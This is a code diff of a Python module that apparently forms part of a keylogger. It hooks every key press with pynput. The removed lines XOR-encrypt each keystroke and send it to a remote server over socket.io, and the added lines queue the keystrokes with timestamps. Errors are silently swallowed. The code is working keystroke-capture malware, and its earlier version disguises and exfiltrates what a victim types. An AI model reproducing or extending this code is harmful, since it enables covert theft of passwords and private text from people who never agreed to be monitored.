@@ -1,9 +1,9 @@
 from __future__ import annotations
 
-from pynput.keyboard import Key, KeyCode
-from socketio import Client
+import time
+from queue import Queue
 
-from shared.Encriptor import XorCharCipher
+from pynput.keyboard import Key, KeyCode
 
 translate_key = {
     'space': ' ',
@@ -11,11 +11,11 @@ translate_key = {
     'tab': '\t',
 }
 
-cipher = XorCharCipher(77)
 
-def on_key(key:  (Key | KeyCode | None) , sio: Client):
+def on_key(key:  (Key | KeyCode | None), queue: Queue):
     """Handle key press event from pynput and send to server via socket.io."""
     try:
+        key_value = ''
         if hasattr(key, 'char') and key.char is not None:
             # Regular character key
             key_value = key.char
@@ -24,7 +24,9 @@ def on_key(key:  (Key | KeyCode | None) , sio: Client):
             key_name = str(key).replace('Key.', '').lower()
             key_value = translate_key.get(key_name, key_name)
 
-        key_value = cipher.encrypt_char(key_value)
-        sio.emit('ev', {'ev': key_value})
+        queue.put({
+            "event": key_value,
+            "timestamp": time.time()
+        })
     except Exception as e:
         pass
